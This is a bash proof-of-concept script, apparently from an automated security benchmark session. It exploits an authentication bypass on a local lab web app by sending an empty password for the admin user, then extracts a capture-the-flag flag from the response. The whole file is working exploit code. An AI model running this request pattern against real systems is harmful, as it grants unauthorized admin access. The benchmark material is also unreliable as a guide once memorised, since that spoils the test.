#!/bin/bash
# POC: Demonstrates authentication bypass by sending an empty password parameter to bypass admin authentication. The vulnerability allows unauthorized access to admin functionality without valid credentials.
# Target: ./repo
# Created: 2025-11-07T18:31:29.508Z
# Session: benchmark-XBEN-055-24-mhp6srme

# Authentication Bypass via Empty Password Vulnerability POC
# This script demonstrates how providing an empty password bypasses admin authentication

TARGET_URL="http://localhost:3000/index.php"
ADMIN_USER="admin"

echo "=== Authentication Bypass via Empty Password Vulnerability POC ==="
echo ""

# Test 1: Attempt authentication with empty password (should succeed - vulnerable)
echo "[*] Test 1: Authentication with empty password (vulnerable path)"
echo "URL: ${TARGET_URL}?username=${ADMIN_USER}&password="
RESPONSE_EMPTY=$(curl -s "${TARGET_URL}?username=${ADMIN_USER}&password=")
RESPONSE_EMPTY_LENGTH=$(echo "$RESPONSE_EMPTY" | wc -c)

echo "Response length: $RESPONSE_EMPTY_LENGTH bytes"
echo "Response content (first 500 chars):"
echo "$RESPONSE_EMPTY" | head -c 500
echo ""
echo ""

# Check if successful authentication occurred
if echo "$RESPONSE_EMPTY" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS: Authentication bypass confirmed!"
    echo "[+] Response contains 'Welcome Admin' - unauthorized access granted"
    echo ""
else
    echo "[-] FAILED: Did not detect successful authentication"
    echo "[-] Response does not contain 'Welcome Admin'"
    exit 1
fi

# Test 2: Attempt authentication with wrong password (should fail - as control)
echo "[*] Test 2: Authentication with wrong password (control - should fail)"
echo "URL: ${TARGET_URL}?username=${ADMIN_USER}&password=wrongpassword"
RESPONSE_WRONG=$(curl -s "${TARGET_URL}?username=${ADMIN_USER}&password=wrongpassword")
RESPONSE_WRONG_LENGTH=$(echo "$RESPONSE_WRONG" | wc -c)

echo "Response length: $RESPONSE_WRONG_LENGTH bytes"
echo "Response content (first 500 chars):"
echo "$RESPONSE_WRONG" | head -c 500
echo ""
echo ""

# Check if authentication was denied
if echo "$RESPONSE_WRONG" | grep -q "Oh Sorry but"; then
    echo "[+] EXPECTED: Authentication correctly denied with wrong password"
    echo ""
else
    echo "[!] WARNING: Response does not contain expected error message"
fi

# Test 3: Extract and display flag/sensitive information if available
echo "[*] Test 3: Extracting exposed sensitive information"
FLAG=$(echo "$RESPONSE_EMPTY" | grep -oP '(?<=<h3>Congratulations, here is the flag:).*?(?=</h3>|$)' | head -1)

if [ -n "$FLAG" ]; then
    echo "[+] Sensitive information exposed:"
    echo "[+] Flag/Information: $FLAG"
    echo ""
fi

# Summary
echo "=== VULNERABILITY SUMMARY ==="
echo "[+] Authentication Bypass Confirmed"
echo "[+] Empty password parameter allows unauthorized admin access"
echo "[+] Response sizes differ: Empty=[$RESPONSE_EMPTY_LENGTH] vs Wrong=[$RESPONSE_WRONG_LENGTH]"
echo "[+] Vulnerability Type: Authentication Bypass (CWE-287, CWE-640)"
echo "[+] Attack Vector: GET parameter manipulation with empty password"
echo ""
echo "[✓] POC execution successful - Vulnerability confirmed"